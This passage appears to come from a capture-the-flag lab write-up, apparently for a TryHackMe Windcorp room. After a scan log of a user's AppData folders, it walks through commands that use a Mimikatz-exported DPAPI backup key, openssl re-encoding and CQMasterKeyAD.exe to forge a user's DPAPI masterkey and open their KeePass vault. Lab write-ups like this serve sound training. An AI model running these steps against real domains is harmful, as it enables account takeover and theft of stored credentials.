Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Compressed (zipped) Folder.ZFSendToTarget
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Desktop (create shortcut).DeskLink
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Documents.mydocs
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Magnify.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Narrator.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\On-Screen Keyboard.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Internet Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Administrative Tools.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\TranscodedWallpaper
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\CachedFiles\CachedImage_1680_1050_POS4.jpg
```

The KeePass masterkey is ` a773eede-71b6-4d66-b4b8-437e01749caa `

Now we will use our new ntlm hash (that we wrote down when we overwrite chajoh password using mimikatz) to make a new masterkey for Keepass

But, we will need to do change the passphrase of DPAPI key as ` CQMasterKeyAD.exe ` uses "cqure" as hardcoded passphrase, while Mimikatz uses "mimikatz" when exporting the pfx.

So we will need to change the pfx using "cqure" as passphrase.

To extract the key using command below with "mimikatz" as passphrase:

```dos
openssl pkcs12 -in DMK.pfx -out temp.pem -nodes
```

Then we re-create the key using command below with "cqure" as passphrase:

```dos
openssl pkcs12 -export -out DMK2.pfx -in temp.pem
```

From here, we can use ` CQMasterKeyAD.exe ` to create new KeePass masterkey as shown below:

```dos
C:\Users\hacker\Desktop>CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
New masterkey file successfully written to: c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
Now swap the old masterkey file with the new one and set the system and hidden attributes, see example:
attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
```

Then, we have to rename the existing masterkey file from ` a773eede-71b6-4d66-b4b8-437e01749caa ` to something else and rename our newly created masterkey ` a773eede-71b6-4d66-b4b8-437e01749caa.admodified ` to ` a773eede-71b6-4d66-b4b8-437e01749caa ` 

Last but not least, we have to use command below to ensure the newly created masterkey set with correct attributes:

```dos
attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H
```

Once above action done, we login to the target computer using " windcorp/chajoh " and open KeePass, voila - magic !

<br />

---

> Do let me know any command or step can be improve or you have any question you can contact me via THM message or write down comment below or via FB




